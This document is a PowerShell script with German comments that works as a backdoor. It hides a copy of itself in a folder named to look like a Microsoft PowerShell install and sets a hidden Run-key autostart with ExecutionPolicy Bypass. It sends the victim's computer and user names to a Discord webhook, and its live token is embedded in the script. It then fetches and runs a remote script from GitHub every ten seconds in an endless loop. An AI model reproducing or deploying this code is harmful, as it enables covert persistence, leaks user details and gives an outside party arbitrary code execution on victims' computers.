# Zielpfad, in den das Repository kopiert wird
$TargetPath = "$env:USERPROFILE\AppData\Local\Programs\Microsoft-Powershell"
# Pfad zum Registrierungsschlüssel
$RegKeyPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
# Name des Registrierungswerts
$ValueName = "MyStartupScript"
# Daten für den Registrierungswert
$ValueData = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$TargetPath\MyCopy.ps1`""
#Webhook Url
$webhookUrl = "https://discordapp.com/api/webhooks/1236328074887299145/nssyhlyQnpJCQ6az6hYDd3VtkfqHMMb3451H2XWgub9GQ-q668mUlMZ1dsngmSHjRvs9"
#Computer und Username des jeweiligen Computers
$computerName = (Get-WmiObject -Class Win32_ComputerSystem).Name
$username = (Get-WmiObject -Class Win32_ComputerSystem).UserName
#Nachricht
$message = @{
    "content" = "Script wurde auf $computerName mit dem User $username gestartet"
}
# Intervall für die Überprüfung in Sekunden (z.B. alle 5 Minuten)
$checkInterval = 10
#Url zu den Github Dateien
$url = "https://raw.githubusercontent.com/Samuitl/New-Test/main/start.ps1"

# Überprüfen und Erstellen des Zielpfads
if (-not (Test-Path -Path $TargetPath)) {
    New-Item -Path $TargetPath -ItemType Directory -Force
    # Kopieren des eigenen Skriptes in das Zielverzeichnis
    $ScriptContents = $MyInvocation.MyCommand.ScriptContents
    $ScriptContents | Out-File -FilePath "$TargetPath\MyCopy.ps1" -Encoding utf8
}
if (-not (Test-Path -Path $TargetPath\MyCopy.ps1)) {
    # Kopieren des eigenen Skriptes in das Zielverzeichnis
    $ScriptContents = $MyInvocation.MyCommand.ScriptContents
    $ScriptContents | Out-File -FilePath "$TargetPath\MyCopy.ps1" -Encoding utf8
    }
 
# Einrichten des Autostart-Eintrags
try {
    Get-ItemProperty -Path $RegKeyPath -Name $valueName -ErrorAction Stop
} catch [System.Management.Automation.ItemNotFoundException] {
    New-Item -Path $RegKeyPath -Force
    New-ItemProperty -Path $RegKeyPath -Name $ValueName -Value $ValueData -Force
} catch {
    New-ItemProperty -Path $RegKeyPath -Name $ValueName -Value $ValueData -Type String -Force
}
#Nachricht wird an Discord Webhook gesendet
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($message | ConvertTo-Json) -ContentType "application/json"
# Funktion zum Herunterladen und Ausführen des Files
function DownloadAndExecuteFile {
    # Herunterladen des Files
    Invoke-WebRequest -Uri $url -OutFile "$TargetPath\start.ps1" -ErrorAction SilentlyContinue
    # Überprüfen, ob das File erfolgreich heruntergeladen wurde
    if (Test-Path "$TargetPath\start.ps1") {
        # Ausführen des heruntergeladenen Files
        Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$TargetPath\start.ps1`"" -NoNewWindow
    }
}
# Schleife für die regelmäßige Ausführung
while ($true) {
    DownloadAndExecuteFile
    Start-Sleep -Seconds $checkInterval
}
